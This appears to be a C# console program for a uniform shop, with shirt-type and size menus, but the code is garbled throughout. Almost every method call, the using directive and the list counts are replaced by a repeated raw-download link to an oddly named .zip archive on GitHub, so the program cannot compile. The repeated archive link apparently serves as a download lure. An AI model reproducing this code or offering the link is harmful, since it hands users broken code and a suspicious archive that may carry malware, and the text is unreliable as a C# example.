# using System;
using https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip;

class UniformShop
{
    private List<string> shirtTypes;
    private List<string> sizes;

    public UniformShop()
    {
        shirtTypes = new List<string> { "T-Shirt", "Polo Shirt", "Button-down Shirt" };
        sizes = new List<string> { "Small", "Medium", "Large", "XL" };
    }

    public void Run()
    {
        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("Welcome to the Uniform Shop!");

        bool continueShopping = true;

        while (continueShopping)
        {
            DisplayShirtTypes();
            DisplaySizes();

            int shirtTypeIndex = GetSelectedIndex("Enter the number corresponding to the shirt type: ", https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip);
            int sizeIndex = GetSelectedIndex("Enter the number corresponding to the size: ", https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip);

            if (shirtTypeIndex == -1 || sizeIndex == -1)
            {
                https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("Invalid selection. Please try again.");
                continue;
            }

            string selectedShirtType = shirtTypes[shirtTypeIndex];
            string selectedSize = sizes[sizeIndex];
            double price = 20.00;

            Shirt shirt = new Shirt(selectedShirtType, selectedSize, price);

            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip();

            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("\nDo you want to place another order? (yes/no)");
            string answer = https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip().ToLower();

            if (answer != "yes")
                continueShopping = false;
        }

        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("\nThank you for shopping with us!");
    }

    private void DisplayShirtTypes()
    {
        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("\nAvailable Shirt Types:");
        for (int i = 0; i < https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip; i++)
        {
            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip($"{i + 1}. {shirtTypes[i]}");
        }
    }

    private void DisplaySizes()
    {
        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("Available Sizes:");
        for (int i = 0; i < https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip; i++)
        {
            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip($"{i + 1}. {sizes[i]}");
        }
    }

    private int GetSelectedIndex(string prompt, int maxIndex)
    {  
        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip(prompt);
        if (https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip(https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip(), out int selectedIndex) && selectedIndex >= 1 && selectedIndex <= maxIndex)
        {
            return selectedIndex - 1;
        }
        return -1;
    }
}
